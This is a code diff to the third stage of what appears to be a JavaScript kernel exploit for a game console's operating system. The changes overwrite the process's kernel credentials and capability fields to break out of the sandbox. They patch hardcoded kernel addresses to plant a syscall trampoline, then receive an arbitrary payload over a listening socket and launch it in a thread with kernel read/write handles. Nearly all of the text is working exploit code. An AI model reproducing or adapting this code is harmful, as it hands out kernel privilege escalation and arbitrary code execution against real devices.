@@ -883,7 +883,7 @@ function stage3() {
 	//alert ("bind: 0x" + bind);
 	
 	let listen = chain.syscall(0x6A, dump_sock_fd, 10);
-	//alert ("listen: 0x" + listen);
+	alert ("listen: 0x" + listen);
 		
 	let accepted = chain.syscall(0x1E, dump_sock_fd, 0, 0);
 	//alert("accepted: 0x" + accepted);
@@ -1453,7 +1453,7 @@ function stage3() {
 	 kernel_write8(proc_ucred.add32(0x30), kernel_read8(new int64(0x81726AE0, 0xFFFFFFFF))); // cr_prison = got_prison0 address
 	 debug_log("cr_prison after: "  + kernel_read8(proc_ucred.add32(0x30)));
 	 debug_log("auth_id_before: "  + kernel_read8(proc_ucred.add32(0x58)));
-	 kernel_write8(proc_ucred.add32(0x58), new int64(0x00000010, 0x48000000)); // cr_sceAuthId
+	 kernel_write8(proc_ucred.add32(0x58), new int64(0x00000013, 0x48010000)); // cr_sceAuthId
 	 debug_log("auth_id after: "  + kernel_read8(proc_ucred.add32(0x58)));
 	 debug_log("cr_sceCaps 0 before: "  + kernel_read8(proc_ucred.add32(0x60)));
 	 kernel_write8(proc_ucred.add32(0x60), new int64(0xFFFFFFFF, 0xFFFFFFFF)); // cr_sceCaps[0]
@@ -1491,9 +1491,33 @@ function stage3() {
 	 debug_log("fd_rdir after: "  + kernel_read8(proc_fd.add32(0x18)));
 	is_in_sandbox = chain.syscall(0x249);
     debug_log("[+] we escaped now? after in sandbox: " + is_in_sandbox);
+	
+	//alert("before trampoline");
+	/*
+	FFFFFFFF8026DAB0 FF 26 trampoline
+	FFFFFFFF815056D8 syscall 11 offset
+	*/
+	
+	//alert("after trampoline");
   
 	let uid_is_set = chain.syscall(23, 0);
 	
+	//alert("trampoline_buffer" + trampoline_buffer);
+	//alert("val before: " + kernel_read8(new int64(0x814FC7E0,0xFFFFFFFF)));
+	//alert("val2 before: " + kernel_read8(new int64(0x814FC808,0xFFFFFFFF)));
+	//alert("val3 before: " + kernel_read8(new int64(0x815056D0,0xFFFFFFFF)));
+	//alert("val4 before: " + kernel_read8(new int64(0x815056F8,0xFFFFFFFF)));
+	kernel_write4(new int64(0x814FC7E0,0xFFFFFFFF), 0x00000002);
+	kernel_write4(new int64(0x814FC80C,0xFFFFFFFF), 0x00000001);
+	kernel_write8(new int64(0x814FC7E8,0xFFFFFFFF), new int64(0x8026DAB0,0xFFFFFFFF));
+	kernel_write8(new int64(0x815056D8,0xFFFFFFFF), new int64(0x8026DAB0,0xFFFFFFFF));
+	kernel_write4(new int64(0x815056D0,0xFFFFFFFF), 0x00000002);
+	kernel_write4(new int64(0x815056FC,0xFFFFFFFF), 0x00000001);
+	
+	//alert("val: " + kernel_read8(new int64(0x814FC7E0,0xFFFFFFFF)));
+	//alert("val2: " + kernel_read8(new int64(0x814FC808,0xFFFFFFFF)));
+	//alert("val3: " + kernel_read8(new int64(0x815056D0,0xFFFFFFFF)));
+	//alert("val4: " + kernel_read8(new int64(0x815056F8,0xFFFFFFFF)));
 	//alert("uid_is_set: 0x" + uid_is_set.low);
 
 /*
@@ -1515,7 +1539,7 @@ function stage3() {
 	return 0;
 */
 
-	
+	alert("before sending payload");
 	let write_ptr = payload_buffer.add32(0x0);
 	for (;;) {
 		let recvd = chain.syscall(3, accepted, write_ptr, 4096).low;
@@ -1529,27 +1553,28 @@ function stage3() {
 	let clsd2 = chain.syscall(6, accepted);
 	
 	let test_payload_store = p.malloc(0x8);
-	let args = p.malloc(0x8 * 6);
+	
 	
 	let kdata_base = new int64(0x81726600, 0xffffffff);
 
 	// Arguments to entrypoint
-	/*
-	p.write8(args.add32(0x00), syscalls[0x24F]);         // arg1 = dlsym_t* dlsym
-	p.write8(args.add32(0x08), 0);           // arg2 = int *rwpipe[2]
-	p.write8(args.add32(0x10), 0);         // arg3 = int *rwpair[2]
-	p.write8(args.add32(0x18), 0);          // arg4 = uint64_t kpipe_addr
-	p.write8(args.add32(0x20), kdata_base);         // arg5 = uint64_t kdata_base_addr
-	p.write8(args.add32(0x28), test_payload_store); // arg6 = int *payloadout
-	*/
-	/*let result = chain.call(payload_buffer, libKernelBase.add32(0x1D3D0));
-	alert("result: 0x" + result);
-	errno = p.read8(libKernelBase.add32(OFFSET_ERRNO));
-	alert("errno: 0x" + errno);
-	*/
+	
+	let rwpair_mem              = p.malloc(0x8);
+	let args                    = p.malloc(0x8 * 4);
+
+	// Pass master/victim pair to payload so it can do read/write
+	p.write4(rwpair_mem.add32(0x00), master_socket);
+	p.write4(rwpair_mem.add32(0x04), slave_socket);
+	
+	p.write8(args.add32(0x00), libKernelBase.add32(0x1D3D0));         	// arg1 = dlsym_t* dlsym
+	p.write8(args.add32(0x08), pipe_mem);         						// arg2 = int *rwpipe[2]
+	p.write8(args.add32(0x10), rwpair_mem);         					// arg3 = int *rwpair[2]
+	p.write8(args.add32(0x18), proc);          							// arg4 = uint64_t proc
+	
+	
 	let pthread_handle_store = p.malloc(0x8);
 	let pthread_value_store = p.malloc(0x8);
-	chain.call(libKernelBase.add32(OFFSET_lk_pthread_create_name_np), pthread_handle_store, 0x0, payload_buffer, libKernelBase.add32(0x1D3D0), p.stringify("payload"));
+	chain.call(libKernelBase.add32(OFFSET_lk_pthread_create_name_np), pthread_handle_store, 0x0, payload_buffer, args, p.stringify("payload"));
 	chain.call(libKernelBase.add32(OFFSET_lk_pthread_join), p.read8(pthread_handle_store), pthread_value_store);
 }
 
